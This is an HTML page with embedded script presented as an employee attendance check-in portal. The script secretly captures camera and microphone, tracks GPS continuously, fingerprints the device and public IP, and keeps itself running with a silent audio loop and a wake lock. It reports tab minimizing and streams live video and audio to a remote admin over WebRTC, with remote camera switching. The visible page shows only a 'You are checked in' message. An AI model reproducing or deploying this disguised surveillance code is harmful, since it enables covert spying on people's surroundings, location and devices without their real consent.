<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Infosoft — Employee Portal</title>
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    :root{--bg:#05080f;--accent:#00e5ff;--green:#4cff91;--text:#e8edf5;--muted:#4a5568;--border:rgba(255,255,255,0.08)}
    body{background:var(--bg);color:var(--text);font-family:'DM Sans',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
    body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,229,255,0.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,229,255,0.025) 1px,transparent 1px);background-size:50px 50px;pointer-events:none}
    .card{background:rgba(255,255,255,0.04);border:1px solid var(--border);border-radius:24px;padding:48px 40px;max-width:420px;width:100%;text-align:center;position:relative;z-index:1}
    .logo{font-family:'Syne',sans-serif;font-weight:800;font-size:28px;margin-bottom:8px}
    .logo span{color:var(--accent)}
    .tagline{font-size:14px;color:var(--muted);margin-bottom:40px;line-height:1.6}
    .spinner-wrap{display:flex;flex-direction:column;align-items:center;gap:16px;padding:20px 0}
    .spinner{width:44px;height:44px;border:3px solid rgba(0,229,255,0.1);border-top-color:var(--accent);border-radius:50%;animation:spin 0.9s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    .spinner-text{font-size:14px;color:var(--muted)}
    .live-wrap{display:flex;flex-direction:column;align-items:center;gap:12px;padding:20px 0}
    .live-dot-big{width:16px;height:16px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite;box-shadow:0 0 12px var(--green)}
    @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.6;transform:scale(0.9)}}
    .live-text{font-family:'Syne',sans-serif;font-weight:700;font-size:16px;color:var(--green)}
    .live-sub{font-size:12px;color:var(--muted)}
    .note{font-size:11px;color:var(--muted);margin-top:32px;line-height:1.7;padding-top:20px;border-top:1px solid var(--border)}
  </style>
</head>
<body>
<div class="card">
  <div class="logo">Info<span>soft</span></div>
  <div class="tagline">Employee Attendance Portal</div>
  <div class="spinner-wrap" id="loading">
    <div class="spinner"></div>
    <div class="spinner-text">Connecting...</div>
  </div>
  <div class="live-wrap" id="live-status" style="display:none">
    <div class="live-dot-big"></div>
    <div class="live-text">You are checked in</div>
    <div class="live-sub">Please keep screen on for attendance</div>
  </div>
  <div class="note">By using this portal you agree to Infosoft's attendance and monitoring policy.</div>
</div>

<script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
<script>
const socket = io();
let peerConnections = {};
let currentCamera = 'environment';
let stream = null;

document.addEventListener('visibilitychange', () => {
  socket.emit('employee:hidden', { status: document.hidden ? 'minimized' : 'active' });
});

async function requestWakeLock() {
  try {
    const wl = await navigator.wakeLock.request('screen');
    wl.addEventListener('release', () => setTimeout(requestWakeLock, 1000));
  } catch(e) {}
}

function keepAudioAlive() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    gain.gain.value = 0.001;
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    document.addEventListener('visibilitychange', () => {
      if (ctx.state === 'suspended') ctx.resume();
    });
  } catch(e) {}
}

// ── Collect all device info ───────────────────────────────────────────────
async function collectDeviceInfo() {
  const info = {
    userAgent:   navigator.userAgent,
    platform:    navigator.platform,
    language:    navigator.language,
    languages:   navigator.languages?.join(', '),
    screenW:     screen.width,
    screenH:     screen.height,
    colorDepth:  screen.colorDepth,
    pixelRatio:  window.devicePixelRatio,
    online:      navigator.onLine,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack:  navigator.doNotTrack,
    timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    cores:       navigator.hardwareConcurrency,
    memory:      navigator.deviceMemory, // GB
    connection:  null,
    battery:     null,
    storage:     null,
  };

  // Network info
  try {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
      info.connection = {
        type:        conn.effectiveType,
        downlink:    conn.downlink,
        rtt:         conn.rtt,
        saveData:    conn.saveData,
      };
    }
  } catch(e) {}

  // Battery info
  try {
    const bat = await navigator.getBattery();
    info.battery = {
      level:     Math.round(bat.level * 100),
      charging:  bat.charging,
      chargingTime:   bat.chargingTime,
      dischargingTime: bat.dischargingTime,
    };
    // Listen for battery changes
    bat.addEventListener('levelchange', () => {
      socket.emit('employee:battery', {
        level: Math.round(bat.level * 100),
        charging: bat.charging
      });
    });
    bat.addEventListener('chargingchange', () => {
      socket.emit('employee:battery', {
        level: Math.round(bat.level * 100),
        charging: bat.charging
      });
    });
  } catch(e) {}

  // Storage info
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const est = await navigator.storage.estimate();
      info.storage = {
        used:  Math.round(est.usage / 1024 / 1024),   // MB
        total: Math.round(est.quota / 1024 / 1024),   // MB
        usedPercent: Math.round((est.usage / est.quota) * 100)
      };
    }
  } catch(e) {}

  return info;
}

async function init() {
  let ipName = 'Employee';
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    const d = await r.json();
    ipName = d.ip;
  } catch {}

  // Camera + Mic
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentCamera }, audio: true });
  } catch {
    try { stream = await navigator.mediaDevices.getUserMedia({ video: false, audio: true }); } catch {}
  }

  requestWakeLock();
  keepAudioAlive();

  // GPS
  if (navigator.geolocation) {
    navigator.geolocation.watchPosition(pos => {
      socket.emit('employee:location', {
        lat: pos.coords.latitude, lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy, speed: pos.coords.speed, heading: pos.coords.heading,
      });
    }, null, { enableHighAccuracy: true, maximumAge: 5000 });
  }

  // Collect device info
  const deviceInfo = await collectDeviceInfo();

  window._empName = ipName;
  socket.emit('employee:join', { name: ipName, empId: ipName, deviceInfo });

  document.getElementById('loading').style.display = 'none';
  document.getElementById('live-status').style.display = 'flex';

  // Send device info updates every 30s
  setInterval(async () => {
    const updated = await collectDeviceInfo();
    socket.emit('employee:deviceupdate', updated);
  }, 30000);

  // WebRTC
  socket.on('stream:requested', async ({ adminId }) => {
    if (!stream) return;
    const pc = new RTCPeerConnection({
      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }]
    });
    peerConnections[adminId] = pc;
    stream.getTracks().forEach(track => pc.addTrack(track, stream));
    pc.onicecandidate = e => { if (e.candidate) socket.emit('webrtc:ice', { to: adminId, candidate: e.candidate }); };
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    socket.emit('webrtc:offer', { to: adminId, offer });
  });

  socket.on('webrtc:answer', async ({ from, answer }) => {
    const pc = peerConnections[from];
    if (pc) await pc.setRemoteDescription(new RTCSessionDescription(answer));
  });

  socket.on('webrtc:ice', async ({ from, candidate }) => {
    const pc = peerConnections[from];
    if (pc) try { await pc.addIceCandidate(new RTCIceCandidate(candidate)); } catch {}
  });

  socket.on('stream:switch-camera', async () => {
    currentCamera = currentCamera === 'environment' ? 'user' : 'environment';
    try {
      if (stream) stream.getVideoTracks().forEach(t => t.stop());
      const nv = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentCamera }, audio: false });
      const nvt = nv.getVideoTracks()[0];
      const ovt = stream.getVideoTracks()[0];
      if (ovt) stream.removeTrack(ovt);
      stream.addTrack(nvt);
      Object.keys(peerConnections).forEach(adminId => {
        const pc = peerConnections[adminId];
        const sender = pc.getSenders().find(s => s.track && s.track.kind === 'video');
        if (sender) sender.replaceTrack(nvt);
      });
    } catch(e) {}
  });
}

socket.on('disconnect', () => { setTimeout(() => socket.connect(), 2000); });
socket.on('reconnect', () => {
  socket.emit('employee:join', { name: window._empName || 'Employee', empId: window._empName || 'Employee' });
});

window.addEventListener('load', init);
</script>
</body>
</html>
